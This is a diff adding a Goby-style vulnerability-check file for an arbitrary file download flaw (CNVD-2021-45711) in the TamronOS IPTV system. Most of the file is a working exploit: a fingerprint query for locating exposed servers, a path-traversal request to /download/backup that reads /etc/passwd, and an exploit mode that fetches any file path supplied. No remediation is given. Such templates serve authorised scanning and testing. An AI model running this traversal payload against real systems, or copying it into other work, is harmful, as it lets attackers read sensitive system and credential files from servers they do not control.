@@ -1,0 +1,99 @@
+{
+      "Name": "TamronOS IPTV system Filedownload CNVD-2021-45711",
+      "Level": "3",
+      "Tags": [
+            "filedownload"
+      ],
+      "GobyQuery": "title=\"TamronOS IPTV系统\"",
+      "Description": "TamronOS IPTV system is a set of live and on-demand system solutions for broadband operators, hotels, schools and other high-traffic scenarios.",
+      "Product": "TamronOS IPTV V5 3.6.6",
+      "Homepage": "http://www.tamronos.com/",
+      "Author": "",
+      "Impact": "An arbitrary file download vulnerability exists in the background of the TamronOS IPTV V5 3.6.6 system, and attackers can exploit this vulnerability to obtain sensitive information.",
+      "Recommendation": "",
+      "References": [
+            "https://www.cnvd.org.cn/flaw/show/CNVD-2021-45711"
+      ],
+      "HasExp": true,
+      "ExpParams": [
+            {
+                  "Name": "file",
+                  "Type": "input",
+                  "Value": "../../../etc/passwd"
+            }
+      ],
+      "ExpTips": {
+            "Type": "",
+            "Content": ""
+      },
+      "ScanSteps": [
+            "AND",
+            {
+                  "Request": {
+                        "method": "GET",
+                        "uri": "/download/backup?name=../../../../../../../../etc/passwd",
+                        "follow_redirect": true,
+                        "header": null,
+                        "data_type": "text",
+                        "data": ""
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "root",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": []
+            }
+      ],
+      "ExploitSteps": [
+            "AND",
+            {
+                  "Request": {
+                        "method": "GET",
+                        "uri": "/download/backup?name={{{file}}}",
+                        "follow_redirect": true,
+                        "header": null,
+                        "data_type": "text",
+                        "data": ""
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "root",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": []
+            }
+      ],
+      "PostTime": "0000-00-00 00:00:00",
+      "GobyVersion": "0.0.0"
+}
